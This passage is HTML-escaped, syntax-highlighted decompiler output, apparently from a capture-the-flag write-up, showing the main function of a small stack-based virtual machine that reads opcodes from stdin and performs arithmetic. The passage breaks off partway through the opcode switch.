class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;112&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;113&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;114&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;115&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;116&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;117&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;118&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;119&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;120&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;121&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;122&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;123&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;124&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;125&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;126&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;127&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;128&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;129&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;130&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;131&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;132&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;133&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;134&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;135&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;136&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;137&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;138&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;139&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;140&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;__int64 __fastcall &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; a1, &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **a2, &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **a3)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  _DWORD *v3; &lt;span class=&#34;comment&#34;&gt;// rbx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  _DWORD *v4; &lt;span class=&#34;comment&#34;&gt;// rbx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  _DWORD *v5; &lt;span class=&#34;comment&#34;&gt;// rbx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  _DWORD *v6; &lt;span class=&#34;comment&#34;&gt;// rbx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  _DWORD *v7; &lt;span class=&#34;comment&#34;&gt;// rbx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  _DWORD *v8; &lt;span class=&#34;comment&#34;&gt;// rbx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  _DWORD *v9; &lt;span class=&#34;comment&#34;&gt;// rbx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  _DWORD *v10; &lt;span class=&#34;comment&#34;&gt;// rbx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  _DWORD *v11; &lt;span class=&#34;comment&#34;&gt;// rbx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  _DWORD *v12; &lt;span class=&#34;comment&#34;&gt;// rbx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  _DWORD *v13; &lt;span class=&#34;comment&#34;&gt;// rbx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  _DWORD *v14; &lt;span class=&#34;comment&#34;&gt;// rbx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  _DWORD *v15; &lt;span class=&#34;comment&#34;&gt;// rcx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __int64 v16; &lt;span class=&#34;comment&#34;&gt;// rdx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __int64 v17; &lt;span class=&#34;comment&#34;&gt;// rsi&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v18; &lt;span class=&#34;comment&#34;&gt;// eax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i; &lt;span class=&#34;comment&#34;&gt;// [rsp+Ch] [rbp-64h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v21; &lt;span class=&#34;comment&#34;&gt;// [rsp+Ch] [rbp-64h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v22; &lt;span class=&#34;comment&#34;&gt;// [rsp+Ch] [rbp-64h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v23; &lt;span class=&#34;comment&#34;&gt;// [rsp+Ch] [rbp-64h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v24; &lt;span class=&#34;comment&#34;&gt;// [rsp+Ch] [rbp-64h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v25; &lt;span class=&#34;comment&#34;&gt;// [rsp+Ch] [rbp-64h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v26; &lt;span class=&#34;comment&#34;&gt;// [rsp+Ch] [rbp-64h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v27; &lt;span class=&#34;comment&#34;&gt;// [rsp+10h] [rbp-60h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v28; &lt;span class=&#34;comment&#34;&gt;// [rsp+14h] [rbp-5Ch]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __int64 *dest; &lt;span class=&#34;comment&#34;&gt;// [rsp+18h] [rbp-58h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; src[&lt;span class=&#34;number&#34;&gt;56&lt;/span&gt;]; &lt;span class=&#34;comment&#34;&gt;// [rsp+20h] [rbp-50h] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 v31; &lt;span class=&#34;comment&#34;&gt;// [rsp+58h] [rbp-18h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v31 = __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  dest = (__int64 *)mmap((&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *)&lt;span class=&#34;number&#34;&gt;0xDEAD0000&lt;/span&gt;LL, &lt;span class=&#34;number&#34;&gt;0x30&lt;/span&gt;uLL, &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;33&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  sub_401286(src);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;memcpy&lt;/span&gt;(dest, src, &lt;span class=&#34;number&#34;&gt;0x30&lt;/span&gt;uLL);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v27 = read(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, (&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *)dest[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;], &lt;span class=&#34;number&#34;&gt;0x10000&lt;/span&gt;uLL);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; ( i = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; i &amp;lt; v27 / &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;; ++i )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;switch&lt;/span&gt; ( *(_DWORD *)(&lt;span class=&#34;number&#34;&gt;4LL&lt;/span&gt; * i + dest[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;]) )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;1&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        v21 = i + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        sub_401334(dest, *(&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; *)(&lt;span class=&#34;number&#34;&gt;4LL&lt;/span&gt; * v21 + dest[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;]));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        i = v21 + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        sub_401334(dest, *(&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; *)(&lt;span class=&#34;number&#34;&gt;4LL&lt;/span&gt; * i + dest[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;]));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        v3 = (_DWORD *)dest[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        *v3 = sub_4013AC(dest);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        v4 = (_DWORD *)(dest[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;] + &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        *v4 = sub_4013AC(dest);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        *(_DWORD *)(dest[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;] + &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;) = *(_DWORD *)dest[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;] + *(_DWORD *)(dest[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;] + &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        sub_401334(dest, *(&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; *)(dest[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;] + &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;2&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        v22 = i + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        sub_401334(dest, *(&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; *)(&lt;span class=&#34;number&#34;&gt;4LL&lt;/span&gt; * v22 + dest[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;]));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        i = v22 + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        sub_401334(dest, *(&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; *)(&lt;span class=&#34;number&#34;&gt;4LL&lt;/span&gt; * i + dest[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;]));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        v5 = (_DWORD *)dest[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        *v5 = sub_4013AC(dest);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        v6 = (_DWORD *)(dest[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;] + &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        *v6 = sub_4013AC(dest);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        *(_DWORD *)(dest[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;] + &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;) = *(_DWORD *)dest[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;] - *(_DWORD *)(dest[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;] + &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        sub_401334(dest, *(&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; *)(dest[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;] + &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;3&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        v23 = i + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        sub_401334(dest, *(&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; *)(&lt;span class=&#34;number&#34;&gt;4LL&lt;/span&gt; * v23 + dest[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;]));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        i = v23 + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        sub_401334(dest, *(&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; *)(&lt;span class=&#34;number&#34;&gt;4LL&lt;/span&gt; * i + dest[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;]));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        v7 = (_DWORD *)dest[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        *v7 = sub_4013AC(dest);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        v8 = (_DWORD *)(dest[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;] + &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        *v8 = sub_4013AC(dest);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        *(_DWORD *)(dest[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;] + &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;) = *(_DWORD *)(dest[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;] + &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;) * *(_DWORD *)dest[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        sub_401334(dest, *(&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; *)(dest[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;] + &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;4&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        v24 = i + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        sub_401334(dest, *(&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; *)(&lt;span class=&#34;number&#34;&gt;4LL&lt;/span&gt; * v24 + dest[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;]));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        i = v24 + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        sub_401334(dest, *(&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; *)(&lt;span class=&#34;number&#34;&gt;4LL&lt;/span&gt; * i + dest[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;]));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        v9 = (_DWORD *)dest[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        *v9 = sub_4013AC(dest);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        v10 = (_DWORD *)(dest[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;] + &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        *v10 = sub_4013AC(dest);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        *(_DWORD *)(dest[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;] + &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;) = *(_DWORD *)dest[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;] / *(_DWORD *)(dest[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;] + &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        sub_401334(dest, *(&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; *)(dest[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;] + &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;5&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        v25 = i + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        sub_401334(dest, *(&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span 